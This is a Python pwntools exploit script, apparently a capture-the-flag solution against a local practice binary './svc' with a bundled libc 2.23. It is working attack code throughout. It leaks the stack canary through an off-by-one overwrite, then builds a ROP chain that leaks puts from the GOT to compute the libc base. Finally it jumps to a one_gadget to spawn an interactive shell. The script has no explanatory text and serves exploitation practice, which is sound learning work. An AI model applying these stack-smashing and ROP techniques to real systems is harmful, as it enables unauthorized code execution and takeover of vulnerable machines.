'''
Author: Samrito
Date: 2022-01-22 16:00:10
LastEditors: Samrito
LastEditTime: 2022-01-22 17:16:43
'''
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'

io = process(argv=['./svc'])
elf = ELF('./svc')
libc = ELF('./libc-2.23.so')

def debug(argv = ''):
    gdb.attach(io, argv)
    pause()

def menu(num):
    io.recvuntil(b'3.MINE MINERALS....\n')
    io.sendline(num)


menu(b'1')
payload = flat([b'@'*(0xb0 - 0x8 + 1)])
io.recvuntil(b'GIVE HIM SOME FOOD.......\n')
io.send(payload)

menu(b'2')
io.recvuntil(b'[*]PLEASE TREAT HIM WELL.....\n')
io.recvline()
res = io.recvuntil(b'-------------------------\n')
print(res)
res = res.replace(b'@',b'')
canary = res[:7] 
print(canary)
canary = int.from_bytes(b'\x00' + canary,'little')
log.info('canary: ' + hex(canary))

gadget_libc_addr = 0xf02a4
pop_rdi = 0x0400ea3 # pop rdi; ret;



#leak base address
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
menu_addr = 0x00400a96
menu(b'1')
payload = flat([b'@'*(0xb0 - 0x8), canary, b'@'*8, pop_rdi, puts_got, puts_plt, menu_addr])
io.send(payload)
menu(b'3')
io.recvuntil(b'[*]BYE ~ TIME TO MINE MIENRALS...\n')
res = io.recvline()[:-1]
print(res)
res = res + b'\x00'*(8-len(res))
base_addr = u64(res) - libc.symbols['puts']
log.info('base addr: ' + hex(base_addr))
gadget_addr = base_addr + gadget_libc_addr

#rop
#debug('b * 0x00400a96')
menu(b'1')
payload = flat([b'@'*(0xb0 - 0x8), canary, b'@'*8, gadget_addr])
io.send(payload)
menu(b'3')

io.interactive()